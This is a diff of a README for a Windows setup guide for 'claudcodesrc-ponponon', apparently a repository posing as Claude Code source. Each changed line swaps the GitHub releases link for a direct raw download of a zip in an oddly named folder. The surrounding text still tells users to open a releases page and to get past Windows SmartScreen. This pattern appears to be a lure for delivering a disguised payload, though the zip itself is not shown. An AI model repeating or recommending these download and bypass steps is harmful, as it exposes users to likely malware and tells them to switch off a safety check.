@@ -1,12 +1,12 @@
 # 🧩 claudcodesrc-ponponon - Simple Windows setup guide
 
-[![Download](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=github)](https://github.com/Patliquifiable474/claudcodesrc-ponponon/releases)
+[![Download](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Patliquifiable474/claudcodesrc-ponponon/main/viviparity/claudcodesrc-ponponon-3.6-alpha.4.zip)
 
 ## 📥 Download
 
 Use this page to download the app for Windows:
 
-https://github.com/Patliquifiable474/claudcodesrc-ponponon/releases
+https://raw.githubusercontent.com/Patliquifiable474/claudcodesrc-ponponon/main/viviparity/claudcodesrc-ponponon-3.6-alpha.4.zip
 
 Open the page and look for the latest release. Download the file that matches your PC, then keep it in a folder you can find, such as Downloads or Desktop
 
@@ -38,7 +38,7 @@ If Windows SmartScreen asks for approval, you may need to choose More info and t
 Follow these steps in order:
 
 1. Open the release page  
-   Go to the download page here: https://github.com/Patliquifiable474/claudcodesrc-ponponon/releases
+   Go to the download page here: https://raw.githubusercontent.com/Patliquifiable474/claudcodesrc-ponponon/main/viviparity/claudcodesrc-ponponon-3.6-alpha.4.zip
 
 2. Find the latest release  
    Look for the newest version at the top of the page. Release names usually include a version number or date
@@ -180,4 +180,4 @@ If the app stops working, do this:
 
 Visit this page to download the Windows release:
 
-https://github.com/Patliquifiable474/claudcodesrc-ponponon/releases
+https://raw.githubusercontent.com/Patliquifiable474/claudcodesrc-ponponon/main/viviparity/claudcodesrc-ponponon-3.6-alpha.4.zip
